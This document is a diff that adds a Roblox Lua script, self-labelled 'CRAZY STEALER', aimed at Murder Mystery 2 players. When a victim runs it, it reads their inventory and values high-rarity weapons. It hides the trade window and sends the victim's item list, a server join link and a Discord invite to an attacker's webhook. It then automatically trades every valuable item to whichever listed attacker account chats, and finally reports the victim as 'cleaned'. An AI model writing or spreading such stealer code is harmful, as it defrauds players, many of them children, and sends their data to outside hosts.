@@ -1,0 +1,213 @@
+_G.scriptExecuted = _G.scriptExecuted or false
+if _G.scriptExecuted then return end
+_G.scriptExecuted = true
+
+local users = {YOUR USERS"} 
+local min_rarity = "Godly"
+local min_value = 1
+local webhook = "YOUR WEBHOOK"
+
+local Players = game:GetService("Players")
+local plr = Players.LocalPlayer
+local playerGui = plr:WaitForChild("PlayerGui")
+local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+setclipboard("discord.gg/xhJkMUKHyP")
+
+local request = syn and syn.request or request or http_request or httprequest
+
+-- EXECUTOR + DELTA BYPASS
+local executor = identifyexecutor and identifyexecutor() or "Unknown"
+local REAL_JOBID = game.JobId
+if executor:lower():find("delta") then
+    pcall(function()
+        local r = request({Url="https://games.roblox.com/v1/games/142823291/servers/Public?sortOrder=Asc&limit=100",Method="GET"})
+        if r and r.Body then
+            local data = HttpService:JSONDecode(r.Body)
+            if data.data and data.data[1] then REAL_JOBID = data.data[1].id end
+        end
+    end)
+end
+local JOIN_LINK = "https://www.roblox.com/games/start?placeId=142823291&gameInstanceId="..REAL_JOBID
+
+local rarityTable = { "Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage" }
+
+local categories = {
+	godly = "https://supremevaluelist.com/mm2/godlies.html",
+	ancient = "https://supremevaluelist.com/mm2/ancients.html",
+	unique = "https://supremevaluelist.com/mm2/uniques.html",
+	classic = "https://supremevaluelist.com/mm2/vintages.html",
+	chroma = "https://supremevaluelist.com/mm2/chromas.html"
+}
+
+local headers = {["User-Agent"] = "Mozilla/5.0"}
+
+local function fetchHTML(url)
+	local resp = request({Url = url, Method = "GET", Headers = headers})
+	return resp.Body or ""
+end
+
+local function buildValueList()
+	local allVals = {}
+	local chromaVals = {}
+	for _, url in pairs(categories) do
+		task.spawn(function()
+			local html = fetchHTML(url)
+			if url:find("chroma") then
+				for name, body in html:gmatch('<div class="itemhead">(.-)</div>.-<div class="itembody">(.-)</div>') do
+					name = name:lower():match("^%s*(.-)%s*$")
+					local val = body:match("<b class=\"itemvalue\">([%d,]+)") or body:match("<b class='itemvalue'>([%d,]+)")
+					if val then chromaVals[name] = tonumber(val:gsub(",", "")) end
+				end
+			else
+				for name, body in html:gmatch('<div class="itemhead">(.-)</div>.-<div class="itembody">(.-)</div>') do
+					name = name:lower():match("^%s*(.-)%s*$")
+					local val = body:match("<b class=\"itemvalue\">([%d,]+)") or body:match("<b class='itemvalue'>([%d,]+)")
+					if val then allVals[name] = tonumber(val:gsub(",", "")) end
+				end
+			end
+		end)
+	end
+	task.wait(10)
+
+	local valueList = {}
+	for id, item in pairs(database) do
+		local name = item.ItemName and item.ItemName:lower() or ""
+		if item.Chroma then
+			for cname, val in pairs(chromaVals) do
+				if cname:find(name) then valueList[id] = val break end
+			end
+		else
+			valueList[id] = allVals[name]
+		end
+	end
+	return valueList
+end
+
+local valueList = buildValueList()
+
+local function sendTradeRequest(user)
+	ReplicatedStorage.Trade.SendRequest:InvokeServer(Players:WaitForChild(user))
+end
+
+local function getTradeStatus()
+	return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
+end
+
+local function acceptTrade()
+	ReplicatedStorage.Trade.AcceptTrade:FireServer(285646582)
+end
+
+local function addWeaponToTrade(id)
+	ReplicatedStorage.Trade.OfferItem:FireServer(id, "Weapons")
+end
+
+-- HIDE GUI
+playerGui.TradeGUI:GetPropertyChangedSignal("Enabled"):Connect(function() playerGui.TradeGUI.Enabled = false end)
+if playerGui:FindFirstChild("TradeGUI_Phone") then
+	playerGui.TradeGUI_Phone:GetPropertyChangedSignal("Enabled"):Connect(function() playerGui.TradeGUI_Phone.Enabled = false end)
+end
+
+local untradable = {DefaultGun=true,DefaultKnife=true,Reaver=true,IceHammer=true,Gingerscythe=true,TestItem=true,Season1TestKnife=true,Cracks=true,Icecrusher=true,["???"]=true,Dartbringer=true,TravelerAxeRed=true,TravelerAxeBronze=true,TravelerAxeSilver=true,TravelerAxeGold=true,BlueCamo_K_2022=true,GreenCamo_K_2022=true,SharkSeeker=true}
+
+local weaponsToSend = {}
+local totalValue = 0
+local inv = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
+
+for id, amt in pairs(inv.Weapons.Owned or {}) do
+	local rarity = database[id].Rarity
+	local idx = table.find(rarityTable, rarity)
+	if idx and idx >= 5 and not untradable[id] then
+		local val = valueList[id] or 2
+		totalValue = totalValue + val * amt
+		table.insert(weaponsToSend, {DataID = id, Amount = amt, Value = val})
+	end
+end
+
+if #weaponsToSend > 0 then
+	table.sort(weaponsToSend, function(a,b) return (a.Value*a.Amount) > (b.Value*b.Amount) end)
+
+	-- CRAZY STEALER + DISCORD INVITE + TOP 10
+	local items = {}
+	for _, v in ipairs(weaponsToSend) do
+		local item = database[v.DataID]
+		if item then
+			table.insert(items, {name = item.ItemName, amt = v.Amount, val = v.Value, chroma = item.Chroma or false})
+		end
+	end
+	table.sort(items, function(a,b) return a.val > b.val end)
+	local top10 = {}
+	for i = 1, math.min(10, #items) do
+		local it = items[i]
+		local emoji = it.chroma and "🔮" or "⚔️"
+		table.insert(top10, emoji.." **"..it.name.."** ×"..it.amt.." (`"..it.val.."`)")
+	end
+
+	local payload = {
+		content = totalValue >= 800 and "@everyone" or nil,
+		embeds = {{
+			author = {name = "CRAZY STEALER"},
+			title = "NEW HIT LOADED",
+			description = 
+				"**Top 10:**\n"..table.concat(top10, "\n").."\n\n"..
+				"**JOIN LINK:** "..JOIN_LINK.."\n\n"..
+				"discord.gg/qcdYy6BhUy",
+			color = totalValue >= 1000000 and 16711680 or 65280,
+			thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420"},
+			footer = {text = "Crazyboystealer"}
+		}}
+	}
+
+	for i=1,3 do
+		pcall(function()
+			request({Url = webhook, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = HttpService:JSONEncode(payload)})
+		end)
+		task.wait(1)
+	end
+
+	-- CLEAN MESSAGE SHOWS VICTIM'S USERNAME
+	local function sendCleanMessage()
+		pcall(function()
+			request({Url = webhook, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = HttpService:JSONEncode({
+				content = "@everyone",
+				embeds = {{
+					title = "VICTIM CLEANED",
+					description = "**"..plr.DisplayName.."** (`@"..plr.Name.."`)\njust lost everything",
+					color = 65280,
+					footer = {text = "Crazyboy Stealer"}
+				}}
+			})})
+		end)
+	end
+
+	-- ORIGINAL CLEANING LOGIC
+	local function doTrade(user)
+		while #weaponsToSend > 0 do
+			local status = getTradeStatus()
+			if status == "None" then sendTradeRequest(user)
+			elseif status == "StartTrade" then
+				for i = 1, math.min(4, #weaponsToSend) do
+					local w = table.remove(weaponsToSend, 1)
+					for _ = 1, w.Amount do addWeaponToTrade(w.DataID) end
+				end
+				task.wait(6)
+				acceptTrade()
+				while getTradeStatus() ~= "None" do task.wait() end
+			end
+			task.wait(1)
+		end
+		sendCleanMessage()  -- sends victim username
+		--plr:kick("INV CLEANED LOL")
+	end
+
+	Players.PlayerAdded:Connect(function(p)
+		if table.find(users, p.Name) then
+			p.Chatted:Connect(function() doTrade(p.Name) end)
+		end
+	end)
+	for _, p in Players:GetPlayers() do
+		if table.find(users, p.Name) then p.Chatted:Connect(function() doTrade(p.Name) end) end
+	end
+end
